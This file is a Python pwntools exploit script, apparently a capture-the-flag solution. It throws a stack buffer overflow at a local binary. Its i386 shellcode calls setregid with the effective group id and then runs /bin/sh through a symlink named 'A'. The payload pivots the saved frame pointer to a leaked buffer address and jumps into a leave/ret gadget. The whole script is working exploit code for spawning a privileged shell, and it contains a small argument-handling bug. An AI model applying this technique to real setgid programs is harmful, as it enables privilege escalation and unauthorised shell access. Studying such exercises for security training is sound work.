#!/usr/bin/env python
from pwn import *
import subprocess
import helpers
import pwn
import sys
import os

########################################################
# Setup                                                #
########################################################

# pwnlib forces objdump to use intel syntax, prevented by redefining 
# this function
pwnlib.asm._objdump = lambda *_: ['/usr/bin/x86_64-linux-gnu-objdump']

# get executable
prog = './'
if len(sys.argv) == 2:
  prog += sys.argv[2]
else:
  prog += os.path.basename(os.getcwd())
  prog = prog[:2] + prog[5:]

elf = ELF(prog)
target = elf.process()

# create a symlink and place '.' to PATH (no idea if this part works)
if os.path.exists('A'):
  subprocess.call('rm A', shell=True)
os.symlink('/bin/sh', 'A')
subprocess.call('export PATH=.:$PATH', shell=True)

# use for debugging
#context.terminal = ['tmux', 'splitw', '-h']
#target = gdb.debug([elf.path], gdbscript='''
#                    b *main
#                    c
#                    ''', env={'PATH':'.:/bin'})

# use for debugging
#target = process(prog, setuid=False)
#context.terminal = ['tmux', 'splitw']
#io = gdb.attach(target, gdbscript='b *main')

########################################################
# Exploit                                              #
########################################################
arch = 'i386'
shellcode = '''
    .att_syntax
    .att_mnemonic

    // arg0: getegid(); arg1: getegid()
    push $0x32 
    pop %eax
    int $0x80
    mov %eax, %ebx
    mov %eax, %ecx

    // call setregid(arg1, arg2)
    push $0x47
    pop %eax
    int $0x80

    // arg1 and arg2
    cdq
    xor %ecx, %ecx

    // arg0: '//bin/sh'
    xor %ebx, %ebx
    push %ebx
    push $0x41
    mov %esp, %ebx

    // execve(arg0, arg1, arg2)
    push $0x0b
    pop %eax
    int $0x80
'''
# get buffer address
buffer_addr = int(target.recvline().split()[-1], 16)

# buffer to $ebp
buffer_to_ebp = 0x5

# get input_func address
input_func_addr = elf.symbols['input_func']

# payload has 5 components:
# 1. 'pwn.p32(buffer_addr+4)' is placed at the beginning to 
#    redirect program flow towards the shellcode; otherwise,
#    the program will read in the shellcode as an addr which
#    leads to an error. It is because of this that approaches 
#    the nop sled would not work.
# 2. 'asm(shellcode, arch=arch)' the shellcode itself
# 3. 'pwn.cyclic(buffer_to_ebp)' padding towards the buffer
# 4. 'pwn.p32(buffer_addr-4)' ebp is saved as -4 from the 
#    buffer address to account for offsets from leave and ret
# 5. 'pwn.p32(input_func_addr+105)' jumps to leave and ret 
#    in the input_func which is at offset +105
payload = b''.join([pwn.p32(buffer_addr+4),
                     asm(shellcode, arch=arch),
                     pwn.cyclic(buffer_to_ebp),
                     pwn.p32(buffer_addr-4),
                     pwn.p32(input_func_addr+105)])

########################################################
# Execution                                            #
########################################################
# use for debugging
#target.sendline(payload)
#target.sendline(b'cat flag')
#target.interactive()

# gets flag
flag = helpers.get_flag(elf, payload)
pwn.info(f'Flag: {flag}')
